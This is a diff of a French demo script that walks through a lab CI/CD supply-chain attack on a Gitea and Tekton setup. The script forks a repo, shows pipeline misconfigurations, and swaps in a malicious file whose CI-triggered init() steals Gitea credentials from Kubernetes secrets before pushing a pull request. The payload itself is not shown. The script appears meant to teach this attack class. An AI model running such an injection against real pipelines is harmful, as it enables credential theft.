@@ -100,7 +100,6 @@ pe "curl -s -u '${GITEA_USER}:${GITEA_PASS}' \
   '${GITEA_URL}/api/v1/user' \
   | jq '{login: .login, id: .id, email: .email}'"
 
-wait
 
 # ============================================================================
 # SECTION 2 — Reconnaissance et fork
@@ -109,7 +108,6 @@ wait
 p "On va faire de la reconnaissance sur le repo et le forker depuis l'interface web :"
 p "   ${GITEA_URL}/${UPSTREAM_OWNER}/${UPSTREAM_REPO}"
 
-wait
 
 # ============================================================================
 # SECTION 3 — Clone du fork
@@ -120,15 +118,15 @@ pe "git clone http://${GITEA_USER}:${GITEA_PASS}@gitea.sc.local:30080/${GITEA_US
 pe "cd ${UPSTREAM_REPO}"
 
 p "# Fichier: pr-eventlistener.yaml"
+
+p "# TriggerBinding utilisant le head (fork de l'attaquant):"
+pe "bat --style=numbers -r 35:48 ${WORK_DIR}/${UPSTREAM_REPO}/.tekton/triggers/pr-eventlistener.yaml"
+
 p "# RoleBinding avec ServiceAccount default:"
 pe "bat --style=numbers -r 186:192 ${WORK_DIR}/${UPSTREAM_REPO}/.tekton/triggers/pr-eventlistener.yaml"
 
 p "# Role avec accès aux secrets:"
 pe "bat --style=numbers -r 165:177 ${WORK_DIR}/${UPSTREAM_REPO}/.tekton/triggers/pr-eventlistener.yaml"
-
-
-p "# TriggerBinding utilisant le head (fork de l'attaquant):"
-pe "bat --style=numbers -r 35:48 ${WORK_DIR}/${UPSTREAM_REPO}/.tekton/triggers/pr-eventlistener.yaml"
 
 p "# Task exécutant le code du fork:"
 pe "bat --style=numbers -r 68:72 ${WORK_DIR}/${UPSTREAM_REPO}/.tekton/tasks/pr-quality-check-task.yaml"
@@ -137,14 +135,9 @@ p "# Secret du webhook codé en dur:"
 pe "bat --style=numbers -r 193:200 ${WORK_DIR}/${UPSTREAM_REPO}/.tekton/triggers/pr-eventlistener.yaml"
 
 
-
-p "Structure actuelle du projet :"
-pe "tree -a -I .git"
-
-p "Contenu actuel du fichier cible :"
+p "Contenu actuel du code exécuté au QualityCheck:"
 pe "bat ${TARGET_PATH}"
 
-wait
 
 # ============================================================================
 # SECTION 4 — Creation de la branche
@@ -152,8 +145,6 @@ wait
 
 pe "git checkout -b '${BRANCH_NAME}'"
 pe "git branch -a"
-
-wait
 
 # ============================================================================
 # SECTION 5 — Injection du code malveillant
@@ -165,27 +156,18 @@ p "Regardons les parties interessantes..."
 p "La fonction init() se declenche automatiquement en environnement CI :"
 pe "bat --style=numbers -r 47:54 ${MALICIOUS_SRC}"
 
-wait
-
 p "Elle appelle exfiltrateAndCreateIssue() — le plan d'attaque :"
-pe "bat --style=numbers -r 56:70 ${MALICIOUS_SRC}"
+pe "bat --style=numbers -r 56:60 ${MALICIOUS_SRC}"
 
-wait
+p "Que fait collect?"
+pe "bat --style=numbers -r 107:123 ${MALICIOUS_SRC}"
 
 p "Vol des credentials Gitea depuis les secrets Kubernetes :"
-pe "bat --style=numbers -r 135:190 ${MALICIOUS_SRC}"
+pe "bat --style=numbers -r 139:154 ${MALICIOUS_SRC}"
 
-wait
+# p "On remplace le fichier original par ce code..."
+cp ${MALICIOUS_SRC} ./${TARGET_PATH}
 
-p "Et le main() qui a l'air tout a fait legitime :"
-pe "bat --style=numbers -r 443:478 ${MALICIOUS_SRC}"
-
-wait
-
-p "On remplace le fichier original par ce code..."
-pe "cp ${MALICIOUS_SRC} ./${TARGET_PATH}"
-
-wait
 
 # ============================================================================
 # SECTION 6 — Add, commit, push
@@ -199,7 +181,6 @@ pe "git status"
 pe "git commit -m '${COMMIT_MSG}'"
 pe "git push --set-upstream origin '${BRANCH_NAME}'"
 
-wait
 
 # ============================================================================
 # SECTION 7 — Creation de la Pull Request
@@ -208,7 +189,6 @@ wait
 p "On cree la Pull Request depuis l'interface web de Gitea :"
 p "   ${GITEA_URL}/${UPSTREAM_OWNER}/${UPSTREAM_REPO}/compare/main...${GITEA_USER}:${BRANCH_NAME}"
 
-wait
 
 # ============================================================================
 # SECTION 8 — Verification du resultat
@@ -230,11 +210,11 @@ else
       | jq '.[0] | {number, title, created_at}'"
 fi
 
-wait
 
 # ============================================================================
 # Cleanup
 # ============================================================================
 
 rm -rf "${WORK_DIR}"
+p "✅"
 
